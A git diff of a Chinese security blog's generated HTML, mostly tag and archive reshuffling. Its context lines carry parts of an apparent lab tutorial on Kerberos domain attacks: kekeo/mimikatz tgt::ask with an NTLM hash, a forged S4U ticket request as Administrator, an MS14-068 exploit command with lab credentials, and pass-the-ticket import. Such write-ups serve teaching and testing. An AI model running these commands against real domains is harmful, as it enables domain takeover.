@@ -952,7 +952,7 @@
 <p>执行如下命令</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:PC<span class="literal">-JACK</span><span class="literal">-0DAY</span> /domain:<span class="number">0</span>day.org /NTLM:<span class="number">768623</span>e06fae601be0c04759c87d93d3 /ticket:test.kirbi</span><br></pre></td></tr></table></figure>
 <p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/3a0223b33a18dfef9d228745ada6d32d.png"></p>
-<p>得到<a href="mailto:&#x54;&#x47;&#x54;&#95;&#80;&#x43;&#45;&#x4a;&#65;&#67;&#x4b;&#45;&#48;&#x44;&#65;&#89;&#64;&#48;&#68;&#65;&#x59;&#46;&#79;&#82;&#x47;&#95;&#107;&#x72;&#98;&#x74;&#103;&#x74;">&#x54;&#x47;&#x54;&#95;&#80;&#x43;&#45;&#x4a;&#65;&#67;&#x4b;&#45;&#48;&#x44;&#65;&#89;&#64;&#48;&#68;&#65;&#x59;&#46;&#79;&#82;&#x47;&#95;&#107;&#x72;&#98;&#x74;&#103;&#x74;</a>~<a href="mailto:&#x30;&#x64;&#x61;&#121;&#46;&#x6f;&#114;&#x67;&#x40;&#x30;&#68;&#65;&#89;&#x2e;&#x4f;&#x52;&#x47;&#46;&#x6b;&#105;&#x72;&#x62;&#x69;">&#x30;&#x64;&#x61;&#121;&#46;&#x6f;&#114;&#x67;&#x40;&#x30;&#68;&#65;&#89;&#x2e;&#x4f;&#x52;&#x47;&#46;&#x6b;&#105;&#x72;&#x62;&#x69;</a></p>
+<p>得到<a href="mailto:&#x54;&#x47;&#x54;&#x5f;&#80;&#x43;&#x2d;&#x4a;&#65;&#67;&#x4b;&#x2d;&#x30;&#x44;&#65;&#x59;&#64;&#48;&#68;&#65;&#x59;&#x2e;&#x4f;&#82;&#x47;&#x5f;&#x6b;&#114;&#98;&#x74;&#x67;&#x74;">&#x54;&#x47;&#x54;&#x5f;&#80;&#x43;&#x2d;&#x4a;&#65;&#67;&#x4b;&#x2d;&#x30;&#x44;&#65;&#x59;&#64;&#48;&#68;&#65;&#x59;&#x2e;&#x4f;&#82;&#x47;&#x5f;&#x6b;&#114;&#98;&#x74;&#x67;&#x74;</a>~<a href="mailto:&#48;&#x64;&#x61;&#x79;&#46;&#x6f;&#114;&#x67;&#x40;&#x30;&#x44;&#65;&#x59;&#x2e;&#x4f;&#82;&#x47;&#x2e;&#107;&#x69;&#x72;&#x62;&#x69;">&#48;&#x64;&#x61;&#x79;&#46;&#x6f;&#114;&#x67;&#x40;&#x30;&#x44;&#65;&#x59;&#x2e;&#x4f;&#82;&#x47;&#x2e;&#107;&#x69;&#x72;&#x62;&#x69;</a></p>
 <h2 id="获取ST"><a href="#获取ST" class="headerlink" title="获取ST"></a>获取ST</h2><p>然后我们可以使用这张TGT通过伪造s4u请求以 administrator 用户身份请求访问 OWA2010SP3 CIFS 的ST</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u /tgt:TGT_PC-JACK-0DAY@0DAY.ORG_krbtgt\~0day.org@0DAY.ORG.kirbi /user:Administrator@0day.org /service:cifs/OWA2010SP3.0day.org</span><br></pre></td></tr></table></figure>
 <p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/e7a8bb2fe4bfc13dee77c093401112ee.png"></p>
@@ -1032,7 +1032,7 @@
 <p>域控：WIN-M836NN6NU8B，ip:192.168.10.5</p>
 <h2 id="生成票据"><a href="#生成票据" class="headerlink" title="生成票据"></a>生成票据</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14<span class="literal">-068</span>.exe <span class="literal">-u</span> mars2@Drunkmars.com <span class="literal">-p</span> Fcb0519.. <span class="literal">-s</span> S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-652679085</span><span class="literal">-3170934373</span><span class="literal">-4288938398</span><span class="literal">-1107</span> <span class="literal">-d</span> <span class="number">192.168</span>.<span class="number">10.5</span></span><br></pre></td></tr></table></figure>
 <p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/c4634c1a3f7d9b089f13f50b6e7139d6.png"></p>
-<p>可以看到已经生成了<a href="mailto:&#x54;&#71;&#x54;&#95;&#x6d;&#x61;&#x72;&#115;&#50;&#64;&#x44;&#x72;&#117;&#x6e;&#107;&#x6d;&#97;&#114;&#x73;&#x2e;&#x63;&#x6f;&#109;&#x2e;&#99;&#99;&#97;&#99;&#x68;&#x65;">&#x54;&#71;&#x54;&#95;&#x6d;&#x61;&#x72;&#115;&#50;&#64;&#x44;&#x72;&#117;&#x6e;&#107;&#x6d;&#97;&#114;&#x73;&#x2e;&#x63;&#x6f;&#109;&#x2e;&#99;&#99;&#97;&#99;&#x68;&#x65;</a></p>
+<p>可以看到已经生成了<a href="mailto:&#84;&#71;&#84;&#x5f;&#109;&#97;&#114;&#115;&#50;&#64;&#68;&#x72;&#x75;&#x6e;&#x6b;&#x6d;&#97;&#x72;&#115;&#x2e;&#x63;&#x6f;&#x6d;&#46;&#99;&#x63;&#97;&#99;&#104;&#101;">&#84;&#71;&#84;&#x5f;&#109;&#97;&#114;&#115;&#50;&#64;&#68;&#x72;&#x75;&#x6e;&#x6b;&#x6d;&#97;&#x72;&#115;&#x2e;&#x63;&#x6f;&#x6d;&#46;&#99;&#x63;&#97;&#99;&#104;&#101;</a></p>
 <h2 id="mimikatz导入票据"><a href="#mimikatz导入票据" class="headerlink" title="mimikatz导入票据"></a>mimikatz导入票据</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptc 票据路径</span><br></pre></td></tr></table></figure>
 <p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/723d8e4bc3a17bb2edac4614e249c994.png"></p>
 <h2 id="访问域控-2"><a href="#访问域控-2" class="headerlink" title="访问域控"></a>访问域控</h2><p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/ea07d8cb64b6c712c900515fccf959a6.png"></p>
@@ -1615,7 +1615,36 @@
         
         
         
+        
+        
+        
+        
+        
     
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
         
         
         
@@ -2418,7 +2447,7 @@
     
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 80
+        Total : 81
         </div>
         <!-- search  -->
         
@@ -2432,6 +2461,12 @@
             <div class="archive-year"> 2021 </div>
             <ul class="year-list">
             
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/04</span>
+            <a class="archive-post-title" href="/2021/10/04/csv%E6%B3%A8%E5%85%A5/">CSV注入获取meterpreter</a>
+        </li>
+    
         
         <li class="archive-post-item">
             <span class="archive-post-date">10/04</span>
@@ -2669,13 +2704,13 @@
         
         <li class="archive-post-item">
             <span class="archive-post-date">05/12</span>
-            <a class="archive-post-title" href="/2021/05/12/EmpireCMS%EF%BC%88%E5%B8%9D%E5%9B%BDcms%EF%BC%89/">Empirecms(帝国cms)漏洞分析及复现</a>
+            <a class="archive-post-title" href="/2021/05/12/Dedecms%EF%BC%88%E7%BB%87%E6%A2%A6cms%EF%BC%89/">Dedecms(织梦cms)漏洞分析及复现</a>
         </li>
     
         
         <li class="archive-post-item">
             <span class="archive-post-date">05/12</span>
-            <a class="archive-post-title" href="/2021/05/12/Dedecms%EF%BC%88%E7%BB%87%E6%A2%A6cms%EF%BC%89/">Dedecms(织梦cms)漏洞分析及复现</a>
+            <a class="archive-post-title" href="/2021/05/12/EmpireCMS%EF%BC%88%E5%B8%9D%E5%9B%BDcms%EF%BC%89/">Empirecms(帝国cms)漏洞分析及复现</a>
         </li>
     
         
@@ -2928,14 +2963,14 @@
                 private
             </span>
         
-            <span class="sidebar-tag-name" data-tags="二进制">
-                <span class="iconfont-archer">&#xe606;</span>
-                二进制
-            </span>
-        
             <span class="sidebar-tag-name" data-tags="C++">
                 <span class="iconfont-archer">&#xe606;</span>
                 C++
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="二进制">
+                <span class="iconfont-archer">&#xe606;</span>
+                二进制
             </span>
         
             <span class="sidebar-tag-name" data-tags="内网渗透">
@@ -2953,14 +2988,14 @@
                 漏洞复现
             </span>
         
-            <span class="sidebar-tag-name" data-tags="web渗透">
-                <span class="iconfont-archer">&#xe606;</span>
-                web渗透
-            </span>
-        
             <span class="sidebar-tag-name" data-tags="cms">
                 <span class="iconfont-archer">&#xe606;</span>
                 cms
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="web渗透">
+                <span class="iconfont-archer">&#xe606;</span>
+                web渗透
             </span>
         
             <span class="sidebar-tag-name" data-tags="kerberos">
@@ -2973,24 +3008,19 @@
                 域渗透
             </span>
         
-            <span class="sidebar-tag-name" data-tags="横向移动">
-                <span class="iconfont-archer">&#xe606;</span>
-                横向移动
-            </span>
-        
             <span class="sidebar-tag-name" data-tags="提权">
                 <span class="iconfont-archer">&#xe606;</span>
                 提权
             </span>
         
+            <span class="sidebar-tag-name" data-tags="横向移动">
+                <span class="iconfont-archer">&#xe606;</span>
+                横向移动
+            </span>
+        
             <span class="sidebar-tag-name" data-tags="ctf">
                 <span class="iconfont-archer">&#xe606;</span>
                 ctf
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="java中间件">
-                <span class="iconfont-archer">&#xe606;</span>
-                java中间件
             </span>
         
             <span class="sidebar-tag-name" data-tags="cobalt strike">
@@ -3003,6 +3033,11 @@
                 apt
             </span>
         
+            <span class="sidebar-tag-name" data-tags="java中间件">
+                <span class="iconfont-archer">&#xe606;</span>
+                java中间件
+            </span>
+        
             <span class="sidebar-tag-name" data-tags="oa">
                 <span class="iconfont-archer">&#xe606;</span>
                 oa
@@ -3013,14 +3048,19 @@
                 msf命令
             </span>
         
+            <span class="sidebar-tag-name" data-tags="mysql">
+                <span class="iconfont-archer">&#xe606;</span>
+                mysql
+            </span>
+        
             <span class="sidebar-tag-name" data-tags="中间件">
                 <span class="iconfont-archer">&#xe606;</span>
                 中间件
             </span>
         
-            <span class="sidebar-tag-name" data-tags="mysql">
+            <span class="sidebar-tag-name" data-tags="thinkphp">
                 <span class="iconfont-archer">&#xe606;</span>
-                mysql
+                thinkphp
             </span>
         
             <span class="sidebar-tag-name" data-tags="sql">
@@ -3031,11 +3071,6 @@
             <span class="sidebar-tag-name" data-tags="web">
                 <span class="iconfont-archer">&#xe606;</span>
                 web
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="thinkphp">
-                <span class="iconfont-archer">&#xe606;</span>
-                thinkphp
             </span>
         
             <span class="sidebar-tag-name" data-tags="环境配置">
